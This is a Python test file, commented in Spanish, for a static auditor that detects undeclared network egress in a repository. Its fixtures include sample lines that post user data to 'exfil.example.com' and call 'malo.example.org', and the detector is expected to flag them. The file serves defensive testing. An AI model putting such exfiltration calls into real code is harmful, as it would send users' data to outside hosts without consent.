"""
Algoritmo del foso «LOCAL» (NORTE) — golden. «Los datos no salen de la máquina» hecho check binario.

Prueba: (1) el repo real está LIMPIO (0 egress sin declarar); (2) el detector tiene DIENTES — caza un
destino a la nube nuevo; (3) ignora lo que NO es egress (docstrings, comentarios, placeholders); (4)
clasifica bien local / conector / lectura pública. Determinista, sin red.
"""

from __future__ import annotations

from scripts.auditoria_foso_local import (
    auditar_repo,
    clasificar,
    es_host_real,
    host_de_url,
    hosts_en_fuente,
)

# ── 1) El repo real cumple el foso ────────────────────────────────────────────


def test_repo_sin_egress_sin_declarar():
    violaciones = auditar_repo()
    assert violaciones == [], f"egress a hosts SIN declarar en el foso: {violaciones}"


# ── 2) Dientes: caza un destino a la nube nuevo ───────────────────────────────


def test_caza_egress_nuevo_a_la_nube():
    codigo = 'import httpx\nhttpx.post("https://exfil.example.com/leak", json=datos_usuario)\n'
    hosts = hosts_en_fuente(codigo)
    assert "exfil.example.com" in hosts
    assert clasificar("exfil.example.com") is None  # NO declarado → violación


def test_caza_url_guardada_en_constante():
    # aunque la URL se asigne a una constante (no sea arg directo de la llamada), se caza.
    codigo = 'EXFIL = "https://malo.example.org"\nhttpx.get(EXFIL)\n'
    assert "malo.example.org" in hosts_en_fuente(codigo)


# ── 3) Ignora lo que NO es egress ─────────────────────────────────────────────


def test_ignora_docstring():
    codigo = '"""Ejemplo de ataque: el navegador manda Origin https://evil.example."""\nx = 1\n'
    assert hosts_en_fuente(codigo) == []


def test_ignora_placeholder_sin_host_real():
    # "https://..." en una descripción de tool no es un host real → no se marca.
    codigo = 'desc = {"description": "URL completa (https://...)."}\n'
    assert hosts_en_fuente(codigo) == []


def test_localhost_y_conector_se_permiten():
    codigo = (
        "import httpx\n"
        'httpx.get("http://127.0.0.1:8787/x")\n'
        'httpx.get("https://gmail.googleapis.com/v1/y")\n'
    )
    for host in hosts_en_fuente(codigo):
        assert clasificar(host) is not None, host


# ── 4) Helpers puros ──────────────────────────────────────────────────────────


def test_host_de_url_quita_puerto():
    assert host_de_url("http://127.0.0.1:8787/path") == "127.0.0.1"
    assert host_de_url("https://Gmail.Googleapis.com/v1") == "gmail.googleapis.com"
    assert host_de_url("no-es-url") is None


def test_es_host_real_filtra_placeholders():
    assert es_host_real("gmail.googleapis.com")
    assert es_host_real("127.0.0.1")
    assert es_host_real("localhost")  # local sin punto, válido
    assert not es_host_real("...")
    assert not es_host_real("host")


def test_clasifica_categorias():
    assert clasificar("localhost") == "LOCAL"
    assert clasificar("gmail.googleapis.com") == "CONECTOR_CONSENTIDO"
    assert clasificar("login.microsoftonline.com") == "CONECTOR_CONSENTIDO"
    assert clasificar("news.ycombinator.com") == "LECTURA_PUBLICA"
    assert clasificar("desconocido.com") is None
